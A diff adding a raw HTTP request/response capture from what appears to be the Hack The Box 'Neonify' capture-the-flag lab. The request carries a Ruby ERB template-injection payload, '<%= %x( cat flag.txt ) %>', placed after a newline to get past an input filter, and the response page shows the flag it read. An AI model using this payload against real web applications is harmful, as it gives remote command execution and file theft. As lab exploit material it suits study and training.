@@ -1,0 +1,46 @@
+POST / HTTP/1.1
+User-Agent: PostmanRuntime/7.32.2
+Accept: */*
+Postman-Token: 97cb0298-5c86-4f11-ba28-2050fa8ce7c4
+Host: 165.232.46.244:31290
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=--------------------------239624670726810933641548
+Content-Length: 186
+ 
+----------------------------239624670726810933641548
+Content-Disposition: form-data; name="neon"
+l
+<%= %x( cat flag.txt ) %>
+----------------------------239624670726810933641548--
+ 
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Content-Length: 562
+X-Xss-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Server: WEBrick/1.6.1 (Ruby/2.7.5/2021-11-24)
+Date: Tue, 13 Jun 2023 06:29:27 GMT
+Connection: Keep-Alive
+ 
+<!DOCTYPE html>
+<html>
+<head>
+<title>Neonify</title>
+<link rel="stylesheet" href="stylesheets/style.css">
+<link rel="icon" type="image/gif" href="/images/gem.gif">
+</head>
+<body>
+<div class="wrapper">
+<h1 class="title">Amazing Neonify Generator</h1>
+<form action="/" method="post">
+<p>Enter Text to Neonify</p><br>
+<input type="text" name="neon" value="">
+<input type="submit" value="Submit">
+</form>
+<h1 class="glow">l
+HTB{r3pl4c3m3n7_s3cur1ty}</h1>
+</div>
+</body>
+</html>
